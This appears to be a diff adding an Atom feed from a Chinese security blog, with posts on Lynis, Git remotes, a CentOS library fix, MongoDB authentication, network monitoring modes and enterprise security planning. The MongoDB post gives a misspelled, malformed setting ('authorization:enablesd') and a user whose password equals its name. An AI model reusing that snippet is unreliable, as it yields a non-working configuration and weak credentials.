@@ -1,0 +1,2277 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.4.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-11-16T17:28:41+08:00</updated><id>http://localhost:4000/</id><title type="html">Pa55w0rd的博客</title><subtitle>记录生活、总结学习经验
+</subtitle><entry><title type="html">Lynis</title><link href="http://localhost:4000/2018/11/16/lynis/" rel="alternate" type="text/html" title="Lynis" /><published>2018-11-16T15:57:42+08:00</published><updated>2018-11-16T15:57:42+08:00</updated><id>http://localhost:4000/2018/11/16/lynis</id><content type="html" xml:base="http://localhost:4000/2018/11/16/lynis/">&lt;p&gt;Lynis是一款面向Linux、Mac OS X、BSD以及Solaris等Unix类系统的安全审计与强化工具。它能够深入扫描并检测系统中的问题、存在漏洞的软件包以及配置设置，并提出相关解决建议。Lynis能够轻松实现安全评估、合规性测试、漏洞检测、配置管理以及补丁管理。&lt;/p&gt;</content><author><name></name></author><summary type="html">Lynis是一款面向Linux、Mac OS X、BSD以及Solaris等Unix类系统的安全审计与强化工具。它能够深入扫描并检测系统中的问题、存在漏洞的软件包以及配置设置，并提出相关解决建议。Lynis能够轻松实现安全评估、合规性测试、漏洞检测、配置管理以及补丁管理。</summary></entry><entry><title type="html">Git修改远程URL</title><link href="http://localhost:4000/2018/11/06/git_edit_remoteurl/" rel="alternate" type="text/html" title="Git修改远程URL" /><published>2018-11-06T17:04:11+08:00</published><updated>2018-11-06T17:04:11+08:00</updated><id>http://localhost:4000/2018/11/06/git_edit_remoteurl</id><content type="html" xml:base="http://localhost:4000/2018/11/06/git_edit_remoteurl/">&lt;p&gt;Github 设置使用了ssh key，每次提交代码还是需要输入用户名？？？&lt;/p&gt;
+
+&lt;p&gt;检查发现，在设置远程url的时候使用了https&lt;/p&gt;
+
+&lt;p&gt;https://github.com/Pa55w0rd/pa55w0rd.github.io.git&lt;/p&gt;
+
+&lt;p&gt;使用git remote set-url命令从https切换到ssh&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# git remote set-url origin git+ssh://git@github.com/Pa55w0rd/pa55w0rd.github.io.git
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;通过git remote -v命令验证是否成功&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# git remote -v
+origin  git+ssh://git@github.com/Pa55w0rd/pa55w0rd.github.io.git (fetch)
+origin  git+ssh://git@github.com/Pa55w0rd/pa55w0rd.github.io.git (push)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;基本使用&quot;&gt;基本使用&lt;/h2&gt;
+
+&lt;h3 id=&quot;建立远程仓库&quot;&gt;建立远程仓库&lt;/h3&gt;
+
+&lt;p&gt;进入GitHub，点击右上角 + 号，选择New repository&lt;/p&gt;
+
+&lt;p&gt;输入仓库名称，点击 Create repository&lt;/p&gt;
+
+&lt;h3 id=&quot;建立本地仓库&quot;&gt;建立本地仓库&lt;/h3&gt;
+
+&lt;p&gt;建立目录，将文件夹初始化为git可以管理的仓库&lt;/p&gt;
+
+&lt;p&gt;git init&lt;/p&gt;
+
+&lt;h3 id=&quot;与远程仓库关联&quot;&gt;与远程仓库关联&lt;/h3&gt;
+
+&lt;p&gt;git remote add origin git@github.com:Pa55w0rd/pa55w0rd.github.io.git&lt;/p&gt;
+
+&lt;h3 id=&quot;添加到暂存区&quot;&gt;添加到暂存区&lt;/h3&gt;
+
+&lt;p&gt;git add .&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;注意最后边的 .&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;提交暂存区到仓库区&quot;&gt;提交暂存区到仓库区&lt;/h3&gt;
+
+&lt;p&gt;git commit -m “init”&lt;/p&gt;
+
+&lt;h3 id=&quot;上传本地仓库到远程仓库&quot;&gt;上传本地仓库到远程仓库&lt;/h3&gt;
+
+&lt;p&gt;git push origin master&lt;/p&gt;
+
+&lt;h3 id=&quot;显示变更的文件&quot;&gt;显示变更的文件&lt;/h3&gt;
+
+&lt;p&gt;git status&lt;/p&gt;
+
+&lt;h3 id=&quot;克隆远程仓库到本地&quot;&gt;克隆远程仓库到本地&lt;/h3&gt;
+
+&lt;p&gt;git clone git@github.com:Pa55w0rd/pa55w0rd.github.io.git&lt;/p&gt;
+
+&lt;h3 id=&quot;高级用法&quot;&gt;高级用法&lt;/h3&gt;
+
+&lt;p&gt;参考 &lt;a href=&quot;http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html&quot;&gt;阮一峰_ 常用Git命令清单&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Github 设置使用了ssh key，每次提交代码还是需要输入用户名？？？ 检查发现，在设置远程url的时候使用了https https://github.com/Pa55w0rd/pa55w0rd.github.io.git 使用git remote set-url命令从https切换到ssh # git remote set-url origin git+ssh://git@github.com/Pa55w0rd/pa55w0rd.github.io.git 通过git remote -v命令验证是否成功 # git remote -v origin git+ssh://git@github.com/Pa55w0rd/pa55w0rd.github.io.git (fetch) origin git+ssh://git@github.com/Pa55w0rd/pa55w0rd.github.io.git (push) 基本使用 建立远程仓库 进入GitHub，点击右上角 + 号，选择New repository 输入仓库名称，点击 Create repository 建立本地仓库 建立目录，将文件夹初始化为git可以管理的仓库 git init 与远程仓库关联 git remote add origin git@github.com:Pa55w0rd/pa55w0rd.github.io.git 添加到暂存区 git add . 注意最后边的 . 提交暂存区到仓库区 git commit -m “init” 上传本地仓库到远程仓库 git push origin master 显示变更的文件 git status 克隆远程仓库到本地 git clone git@github.com:Pa55w0rd/pa55w0rd.github.io.git 高级用法 参考 阮一峰_ 常用Git命令清单</summary></entry><entry><title type="html">Centos 7 运行firefox出错</title><link href="http://localhost:4000/2018/11/06/linux_firefox_error/" rel="alternate" type="text/html" title="Centos 7 运行firefox出错" /><published>2018-11-06T17:03:11+08:00</published><updated>2018-11-06T17:03:11+08:00</updated><id>http://localhost:4000/2018/11/06/linux_firefox_error</id><content type="html" xml:base="http://localhost:4000/2018/11/06/linux_firefox_error/">&lt;p&gt;Centos 7 在firefox官网下载了最新的安装包，运行后提示&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    # firefox
+    XPCOMGlueLoad error for file /root/fuzzingbox/firefox/libmozgtk.so:
+    libgtk-3.so.0: cannot open shared object file: No such file or directory
+    Couldn't load XPCOM.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;提示缺少libgtk-3.so库&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;yum install gtk3
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;</content><author><name></name></author><summary type="html">Centos 7 在firefox官网下载了最新的安装包，运行后提示 # firefox XPCOMGlueLoad error for file /root/fuzzingbox/firefox/libmozgtk.so: libgtk-3.so.0: cannot open shared object file: No such file or directory Couldn't load XPCOM. 提示缺少libgtk-3.so库 yum install gtk3</summary></entry><entry><title type="html">mongodb开启认证</title><link href="http://localhost:4000/2018/11/01/mongodb_auth/" rel="alternate" type="text/html" title="mongodb开启认证" /><published>2018-11-01T13:35:11+08:00</published><updated>2018-11-01T13:35:11+08:00</updated><id>http://localhost:4000/2018/11/01/mongodb_auth</id><content type="html" xml:base="http://localhost:4000/2018/11/01/mongodb_auth/">&lt;p&gt;修改配置文件，开启认证&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# vi /etc/mongod.conf
+
+    security:
+    authorization:enablesd
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;创建密码&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;db.createUser({ user: “w11scan”, pwd: “w11scan”, roles: [{ role: “dbOwner”, db: “w11scan_config” }] })&lt;/strong&gt;  &lt;br /&gt;mongo创建db密码&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;db.auth(“useradmin”, “adminpassword”)&lt;/strong&gt; &lt;br /&gt;验证，1表示成功
+mongodb中的用户是基于身份role的
+    &lt;ul&gt;
+      &lt;li&gt;管理员账户的 role是 userAdminAnyDatabase，‘userAdmin’代表用户管理身份，’AnyDatabase’ 代表可以管理任何数据库。&lt;/li&gt;
+      &lt;li&gt;dbOwner 代表数据库所有者角色，拥有最高该数据库最高权限。比如新建索引等&lt;/li&gt;
+      &lt;li&gt;readWrite 该用户用于该数据的读写，只拥有读写权限。&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;</content><author><name></name></author><summary type="html">修改配置文件，开启认证 # vi /etc/mongod.conf security: authorization:enablesd 创建密码 db.createUser({ user: “w11scan”, pwd: “w11scan”, roles: [{ role: “dbOwner”, db: “w11scan_config” }] }) mongo创建db密码 db.auth(“useradmin”, “adminpassword”) 验证，1表示成功 mongodb中的用户是基于身份role的 管理员账户的 role是 userAdminAnyDatabase，‘userAdmin’代表用户管理身份，’AnyDatabase’ 代表可以管理任何数据库。 dbOwner 代表数据库所有者角色，拥有最高该数据库最高权限。比如新建索引等 readWrite 该用户用于该数据的读写，只拥有读写权限。</summary></entry><entry><title type="html">旁路监控</title><link href="http://localhost:4000/2018/11/01/%E6%97%81%E8%B7%AF%E7%9B%91%E6%8E%A7/" rel="alternate" type="text/html" title="旁路监控" /><published>2018-11-01T13:33:11+08:00</published><updated>2018-11-01T13:33:11+08:00</updated><id>http://localhost:4000/2018/11/01/%E6%97%81%E8%B7%AF%E7%9B%91%E6%8E%A7</id><content type="html" xml:base="http://localhost:4000/2018/11/01/%E6%97%81%E8%B7%AF%E7%9B%91%E6%8E%A7/">&lt;p&gt;常见的网络监控模式可以分为两种：一种是旁路监控模式，另一种是串联监控模式。&lt;/p&gt;
+
+&lt;p&gt;“旁路监控模式”一般是指通过交换机等网络设备的“端口镜像”功能来实现监控，在此模式下，监控设备只需要连接到交换机的指定镜像端口，所以形象的称之为“旁路监控”。&lt;/p&gt;
+
+&lt;p&gt;而串联模式一般是通过网关、网桥或者代理服务器的模式来进行监控，由于监控设备做为网关或者网桥串联在网络中，所以称之为“串联监控模式”。&lt;/p&gt;
+
+&lt;p&gt;旁路模式的优缺点&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;优点：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;旁路监控模式部署起来比较灵活方便，只需要在交换机上面配置镜像端口即可。不会影响现有的网络结构。而串联模式一般要作为网关、网桥或者代理服务器，所以需要对现有网络结构进行变动。&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;旁路模式分析的是镜像端口拷贝过来的数据，对原始传递的数据包不会造成延时，不会对网速造成任何影响。而串联模式是串联在网络中的，那么所有的数据必须先经过监控系统，通过监控系统的分析检查之后，才能够发送到各个客户端，所以会对网速有一定的延时。&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;旁路监控设备一旦故障或者停止运行，不会影响现有网络。而串联监控设备如果出现故障，如无硬件bypass功能，会导致网络中断。&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;缺点：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;需要交换机或者路由支持“端口镜像”功能才可以实现监控。&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;旁路模式采用发送RST包的方式来断开TCP连接，不能禁止UDP通讯。对于UDP应用，一般还需要在路由器上面禁止UDP端口进行配合。而串联模式不存在该问题。&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;</content><author><name></name></author><summary type="html">常见的网络监控模式可以分为两种：一种是旁路监控模式，另一种是串联监控模式。 “旁路监控模式”一般是指通过交换机等网络设备的“端口镜像”功能来实现监控，在此模式下，监控设备只需要连接到交换机的指定镜像端口，所以形象的称之为“旁路监控”。 而串联模式一般是通过网关、网桥或者代理服务器的模式来进行监控，由于监控设备做为网关或者网桥串联在网络中，所以称之为“串联监控模式”。 旁路模式的优缺点 优点： 旁路监控模式部署起来比较灵活方便，只需要在交换机上面配置镜像端口即可。不会影响现有的网络结构。而串联模式一般要作为网关、网桥或者代理服务器，所以需要对现有网络结构进行变动。 旁路模式分析的是镜像端口拷贝过来的数据，对原始传递的数据包不会造成延时，不会对网速造成任何影响。而串联模式是串联在网络中的，那么所有的数据必须先经过监控系统，通过监控系统的分析检查之后，才能够发送到各个客户端，所以会对网速有一定的延时。 旁路监控设备一旦故障或者停止运行，不会影响现有网络。而串联监控设备如果出现故障，如无硬件bypass功能，会导致网络中断。 缺点： 需要交换机或者路由支持“端口镜像”功能才可以实现监控。 旁路模式采用发送RST包的方式来断开TCP连接，不能禁止UDP通讯。对于UDP应用，一般还需要在路由器上面禁止UDP端口进行配合。而串联模式不存在该问题。</summary></entry><entry><title type="html">基线加固文档</title><link href="http://localhost:4000/2018/11/01/%E5%9F%BA%E7%BA%BF%E5%8A%A0%E5%9B%BA/" rel="alternate" type="text/html" title="基线加固文档" /><published>2018-11-01T13:32:11+08:00</published><updated>2018-11-01T13:32:11+08:00</updated><id>http://localhost:4000/2018/11/01/%E5%9F%BA%E7%BA%BF%E5%8A%A0%E5%9B%BA</id><content type="html" xml:base="http://localhost:4000/2018/11/01/%E5%9F%BA%E7%BA%BF%E5%8A%A0%E5%9B%BA/">&lt;p&gt;&lt;a href=&quot;https://github.com/re4lity/Benchmarks&quot;&gt;https://github.com/re4lity/Benchmarks&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://learn.cisecurity.org/benchmarks&quot;&gt;https://learn.cisecurity.org/benchmarks&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://nvd.nist.gov/ncp/repository&quot;&gt;https://nvd.nist.gov/ncp/repository&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">https://github.com/re4lity/Benchmarks https://learn.cisecurity.org/benchmarks https://nvd.nist.gov/ncp/repository</summary></entry><entry><title type="html">甲方安全建设步骤 By pirogue</title><link href="http://localhost:4000/2018/10/31/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E6%AD%A5%E9%AA%A4/" rel="alternate" type="text/html" title="甲方安全建设步骤 By pirogue" /><published>2018-10-31T17:17:35+08:00</published><updated>2018-10-31T17:17:35+08:00</updated><id>http://localhost:4000/2018/10/31/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E6%AD%A5%E9%AA%A4</id><content type="html" xml:base="http://localhost:4000/2018/10/31/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E6%AD%A5%E9%AA%A4/">&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;资产梳理&lt;/p&gt;
+
+    &lt;ul&gt;
+      &lt;li&gt;IP列表、业务分组(负责人、联系方向)、业务属性&lt;/li&gt;
+      &lt;li&gt;业务端口&lt;/li&gt;
+      &lt;li&gt;业务应用架构、技术堆栈&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;边界安全，防火墙策略控制（需要梳理业务端口）&lt;/p&gt;
+
+    &lt;ul&gt;
+      &lt;li&gt;如果是硬件，使用防火墙统一控制&lt;/li&gt;
+      &lt;li&gt;如果是操作系统，Iptalbes＋IPSEC&lt;/li&gt;
+      &lt;li&gt;及时监控业务端口的变化（外部nmap扫描搜集结果比对，或者编写脚步放到运维平台收集系统监听端口和防火墙策略)&lt;/li&gt;
+      &lt;li&gt;跳板机安全控制&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;账户安全管理&lt;/p&gt;
+
+    &lt;ul&gt;
+      &lt;li&gt;弱密码&lt;/li&gt;
+      &lt;li&gt;root、sudoer权限&lt;/li&gt;
+      &lt;li&gt;账户、授权、访问、审计等等&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;服务器安全&lt;/p&gt;
+
+    &lt;ul&gt;
+      &lt;li&gt;安全基线检测&lt;/li&gt;
+      &lt;li&gt;操作审计&lt;/li&gt;
+      &lt;li&gt;异常登录审计(日志收集分析)&lt;/li&gt;
+      &lt;li&gt;漏洞清点/扫描，补丁修复测试和推进&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;WEB安全&lt;/p&gt;
+
+    &lt;ul&gt;
+      &lt;li&gt;应用渗透测试&lt;/li&gt;
+      &lt;li&gt;接口安全(加密、通信)&lt;/li&gt;
+      &lt;li&gt;webshell实时监测&lt;/li&gt;
+      &lt;li&gt;Nginx日志分析/Nginx流量旁路分析&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;业务风控安全&lt;/p&gt;
+
+    &lt;ul&gt;
+      &lt;li&gt;用户安全机制（密码、验证码、登录）&lt;/li&gt;
+      &lt;li&gt;交易安全&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;安全培训&lt;/p&gt;
+
+    &lt;ul&gt;
+      &lt;li&gt;安全意识培训&lt;/li&gt;
+      &lt;li&gt;运维安全培训&lt;/li&gt;
+      &lt;li&gt;WEB安全开发&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;安全规范和流程&lt;/p&gt;
+
+    &lt;ul&gt;
+      &lt;li&gt;人员入职账户开通&lt;/li&gt;
+      &lt;li&gt;人员离职账户注销&lt;/li&gt;
+      &lt;li&gt;服务器上下架安全管理&lt;/li&gt;
+      &lt;li&gt;安全应急响应机制&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;内网安全&lt;/p&gt;
+
+    &lt;ul&gt;
+      &lt;li&gt;内网服务器安全&lt;/li&gt;
+      &lt;li&gt;账户统一验证和管理机制(域ldap协议统一验证OA、RTX、邮件、内网业务系统)&lt;/li&gt;
+      &lt;li&gt;弱口令监测(NTLM/LM)&lt;/li&gt;
+      &lt;li&gt;账户异常登录&lt;/li&gt;
+      &lt;li&gt;网络隔离（物理／虚拟化）&lt;/li&gt;
+      &lt;li&gt;网络准入&lt;/li&gt;
+      &lt;li&gt;PC安全（病毒统一管理、通知处理）&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;strong&gt;一张图看透办公网安全 -Eleven&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\办公网安全.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">资产梳理 IP列表、业务分组(负责人、联系方向)、业务属性 业务端口 业务应用架构、技术堆栈 边界安全，防火墙策略控制（需要梳理业务端口） 如果是硬件，使用防火墙统一控制 如果是操作系统，Iptalbes＋IPSEC 及时监控业务端口的变化（外部nmap扫描搜集结果比对，或者编写脚步放到运维平台收集系统监听端口和防火墙策略) 跳板机安全控制 账户安全管理 弱密码 root、sudoer权限 账户、授权、访问、审计等等 服务器安全 安全基线检测 操作审计 异常登录审计(日志收集分析) 漏洞清点/扫描，补丁修复测试和推进 WEB安全 应用渗透测试 接口安全(加密、通信) webshell实时监测 Nginx日志分析/Nginx流量旁路分析 业务风控安全 用户安全机制（密码、验证码、登录） 交易安全 安全培训 安全意识培训 运维安全培训 WEB安全开发 安全规范和流程 人员入职账户开通 人员离职账户注销 服务器上下架安全管理 安全应急响应机制 内网安全 内网服务器安全 账户统一验证和管理机制(域ldap协议统一验证OA、RTX、邮件、内网业务系统) 弱口令监测(NTLM/LM) 账户异常登录 网络隔离（物理／虚拟化） 网络准入 PC安全（病毒统一管理、通知处理） 一张图看透办公网安全 -Eleven</summary></entry><entry><title type="html">企业安全建设中评估业务潜在风险的思路（转发）</title><link href="http://localhost:4000/2018/10/31/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E4%B8%AD%E8%AF%84%E4%BC%B0%E4%B8%9A%E5%8A%A1%E6%BD%9C%E5%9C%A8%E9%A3%8E%E9%99%A9%E7%9A%84%E6%80%9D%E8%B7%AF/" rel="alternate" type="text/html" title="企业安全建设中评估业务潜在风险的思路（转发）" /><published>2018-10-31T17:16:35+08:00</published><updated>2018-10-31T17:16:35+08:00</updated><id>http://localhost:4000/2018/10/31/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E4%B8%AD%E8%AF%84%E4%BC%B0%E4%B8%9A%E5%8A%A1%E6%BD%9C%E5%9C%A8%E9%A3%8E%E9%99%A9%E7%9A%84%E6%80%9D%E8%B7%AF</id><content type="html" xml:base="http://localhost:4000/2018/10/31/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E4%B8%AD%E8%AF%84%E4%BC%B0%E4%B8%9A%E5%8A%A1%E6%BD%9C%E5%9C%A8%E9%A3%8E%E9%99%A9%E7%9A%84%E6%80%9D%E8%B7%AF/">&lt;blockquote&gt;
+  &lt;p&gt;From : &lt;a href=&quot;https://xz.aliyun.com/t/1529/&quot;&gt;elknot@360corpsec&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#0x00-写在前面&quot; id=&quot;markdown-toc-0x00-写在前面&quot;&gt;0x00 写在前面：&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#0x01-所谓安全攻击态势是什么&quot; id=&quot;markdown-toc-0x01-所谓安全攻击态势是什么&quot;&gt;0x01 所谓安全攻击态势是什么&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#0x02-业务系统潜在风险&quot; id=&quot;markdown-toc-0x02-业务系统潜在风险&quot;&gt;0x02 业务系统潜在风险&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#0x03-写报告&quot; id=&quot;markdown-toc-0x03-写报告&quot;&gt;0x03 写报告&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;0x00-写在前面&quot;&gt;0x00 写在前面：&lt;/h2&gt;
+
+&lt;p&gt;昨天和某巨佬私下交流的时候，巨佬遇到了一个问题，甲方有一个比较难搞的需求：让这位巨佬给他提供一个安全攻击态势的模型。当时这个需求听完之后我觉得有点难办。但是后来想了一下也不是没有可能去做，由于以下的说法仅作为一些思路，落地性还有待考察，所以大家针对落地问题先不要去喷了。&lt;/p&gt;
+
+&lt;h2 id=&quot;0x01-所谓安全攻击态势是什么&quot;&gt;0x01 所谓安全攻击态势是什么&lt;/h2&gt;
+
+&lt;p&gt;跟巨佬的进一步聊天中，我大概明白了甲方的意思：对下属子公司进行考核。其实巨佬自己也知道这个模型偏向于管理而非技术，只是需要技术数据的支撑。那么实际上其实根据我个人的理解就是：客户需要把业务系统所面临的潜在风险罗列出来，并且考核安全部门对于这些潜在风险的解决成果。&lt;/p&gt;
+
+&lt;p&gt;那么我们的思路就逐渐清晰了，我们需要了解的也就是业务系统会面临那些潜在的风险和安全部门应对这些风险的技战术手段。&lt;/p&gt;
+
+&lt;h2 id=&quot;0x02-业务系统潜在风险&quot;&gt;0x02 业务系统潜在风险&lt;/h2&gt;
+
+&lt;p&gt;但从业务系统的潜在风险来判断的话，很多人第一反应就是日志，换句话说，很多领导要是问安全部门的同事我们系统的潜在风险是什么，经验不足的安全管理人员可能会马上从SIEM中抽取相关的安全日志（如果连SIEM都没有的话，那就是只能亲自动手去所有的安全设备的日志中逐条检索，所以针对大型的系统而言，规模越大SIEM的需求也就越高），然后按照攻击事件的数量排序，最后给出来一个所谓的“业务安全潜在风险分析报告”。但是各位仔细想一下就会发现这份报告实际上是有问题的，首先领导要的是“业务系统潜在风险”，而非是“已经发生的安全事件的统计”，换句话说安全部门提供的报告是领导期望的。那么如何评定业务系统的潜在风险呢？&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;（1）业务系统活跃指数&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;首先，针对一个系统而言，业务系统的活跃指数也就是能够被人访问到的几率是一个指标，如果这个业务系统被网络隔离了，也就只有内部的人可以访问的到，那么攻击面就大大减小了。那么如何判断这个系统的活跃指数呢。个人认为PV、UV、搜索引擎排名和Alexa指数这四个数据可以一定程度上来描述业务系统的活跃指数，PV、UV越大、搜索引擎排名越高、Alexa指数越高则说明了该系统被互联网用户访问到的可能性就越大，意味着被攻击的概率也就越高。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\xss\1.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;上面这张图表示的就是Alexa的指数，指数越高也就是用户访问越频繁。当然这个只是其中的一方面，越活跃不一定代表受攻击的可能越大。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;（2）业务安全风险评定&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;活跃指数只能判断出该业务系统被访问的次数，但是这仅仅是外因。被攻击的可能起决定因素的不是外因而是内因。所谓的内因也就是业务系统资深的原因，比如说用了不安全的框架、中间件存在已知漏洞、管理平台弱口令等等，然而这些问题其实解决起来不是特别的容易，一方面原因是业务系统稳定之后不太可能进行大范围的重构，二是因为开发部门对于安全方面可能不是特别懂，甚至有些大哥直接把测试环境部署到外网上去。&lt;/p&gt;
+
+&lt;p&gt;其实这些问题如果企业按部就班的走SDL的话，问题应该不大，因为SDL对于系统的安全开发存在一步威胁建模，就比如下面这张图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\威胁类别与应对策略.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;STRIDE威胁建模其实是一个很好的评估手段，但是很不幸，很多业务并不会去遵守这一套，这里安全部门就要多跑腿了，要定期对业务系统进行主动的渗透测试和安全监测，保证业务系统不存在可以被恶意利用的漏洞，&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;（3）历史攻击攻击行为比对&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;这一部分其实就是从SIEM中抽取对应业务系统的安全日志，然后将其统计分类最后按照影响范围统计出来攻击的行为，但是这么做的话还远远不够，因为攻击日志里面有些是成功的有些是失败的，有些是人产生的有些是机器产生的。判断历史攻击行为的时候应当注意以下几点：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;确保SIEM中日志的有效性和准确性&lt;/li&gt;
+  &lt;li&gt;统计攻击事件中成功次数与总次数所占的比例&lt;/li&gt;
+  &lt;li&gt;列出所有攻击行为有特点的IP进行简单溯源&lt;/li&gt;
+  &lt;li&gt;对攻击成功的IP进行重点监测并进行针对性溯源&lt;/li&gt;
+  &lt;li&gt;回顾以往众测或者企业SRC收上来的漏洞利用报告&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;这样的话你将会得到：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;一份带有详细数据的事件统计报告&lt;/li&gt;
+  &lt;li&gt;一份发起攻击行为IP的列表&lt;/li&gt;
+  &lt;li&gt;一份成功发起攻击行为IP的列表&lt;/li&gt;
+  &lt;li&gt;N份漏洞利用及分析报告&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;统计完成之后接下来就可以进行下一环节。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;（4）IP溯源及引入情报体系&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;上面我们得到了一些攻击IP的数据，有些是成功的有些是失败的，这时候我们可以利用外部的威胁情报数据对这些IP进行浅层次或者深层次的溯源，浅层次的溯源主要是针对发起攻击但是失败的，需要收集的信息包括：IP的信誉度、地理位置、绑定的域名、域名注册时间、接入类型、被恶意标记的内容。&lt;/p&gt;
+
+&lt;p&gt;这些信息可以帮助我们去判断这些IP是不是肉鸡还是真实的攻击者，举个例子，假设一个IP的是一个荷兰OVH的主机，对我们输出的日志大多数都为扫描、注入类型的攻击，我们只接通过网络策略把这个IP拉黑了就可以了，因为他不是一个真是的攻击者而是一台肉鸡。相反的，如果一个IP攻击的行为包括社工、撞库、恶意漏洞利用、shell管理，并且接入方式是家庭宽带动态IP，那么这个IP我们就应该重点关注，甚至对其进行更深层次的溯源分析。&lt;/p&gt;
+
